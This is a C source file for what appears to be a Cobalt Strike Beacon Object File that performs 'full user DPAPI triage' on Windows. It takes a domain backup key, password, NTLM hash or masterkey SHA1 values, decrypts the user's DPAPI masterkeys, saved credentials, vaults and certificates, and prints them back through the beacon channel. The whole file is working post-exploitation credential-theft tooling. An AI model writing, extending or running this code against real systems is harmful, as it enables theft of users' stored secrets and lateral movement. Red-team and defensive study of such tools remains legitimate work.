/*
 * triage_bof.c — BOF for full user DPAPI triage
 *
 * Usage:
 *   triage [/pvk:BASE64] [/password:PASSWORD] [/ntlm:HASH]
 *          [/credkey:KEY] [/server:SERVER] [/showall] [/rpc]
 *
 * All-in-one: masterkeys + credentials + vaults + certificates.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "dpapi_common.h"
#include "triage.h"
#include "helpers.h"

void go(char* args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char* pvk_b64    = BeaconDataExtract(&parser, NULL);
    char* password   = BeaconDataExtract(&parser, NULL);
    char* ntlm       = BeaconDataExtract(&parser, NULL);
    char* credkey    = BeaconDataExtract(&parser, NULL);
    char* server_str = BeaconDataExtract(&parser, NULL);
    int   show_all   = BeaconDataInt(&parser);
    int   use_rpc    = BeaconDataInt(&parser);

    BYTE* pvk = NULL;
    int pvk_len = 0;
    if (pvk_b64 && strlen(pvk_b64) > 0)
        pvk = base64_decode(pvk_b64, &pvk_len);

    wchar_t* server = NULL;
    if (server_str && strlen(server_str) > 0) server = utf8_to_wide(server_str);

    MASTERKEY_CACHE cache;
    mk_cache_init(&cache);

    /* Pre-load keys */
    if (credkey && strlen(credkey) > 0) {
        char* ck = (char*)intAlloc(strlen(credkey) + 1);
        if (ck) {
            strcpy(ck, credkey);
            char* pair = strtok(ck, ",");
            while (pair) {
                char* colon = strchr(pair, ':');
                if (colon) {
                    *colon = 0;
                    GUID guid;
                    if (string_to_guid(pair, &guid)) {
                        int sha1_len = 0;
                        BYTE* sha1 = hex_to_bytes(colon + 1, &sha1_len);
                        if (sha1 && sha1_len == 20) mk_cache_add(&cache, &guid, sha1);
                        if (sha1) intFree(sha1);
                    }
                }
                pair = strtok(NULL, ",");
            }
            intFree(ck);
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== DPAPI Full User Triage (BOF) ===\n");

    triage_user_full(&cache, pvk, pvk_len,
        (password && strlen(password) > 0) ? password : NULL,
        (ntlm && strlen(ntlm) > 0) ? ntlm : NULL,
        NULL, (BOOL)use_rpc, NULL, server, (BOOL)show_all);

    if (cache.count > 0) mk_cache_print(&cache);

    mk_cache_free(&cache);
    if (pvk) intFree(pvk);
    if (server) intFree(server);
}
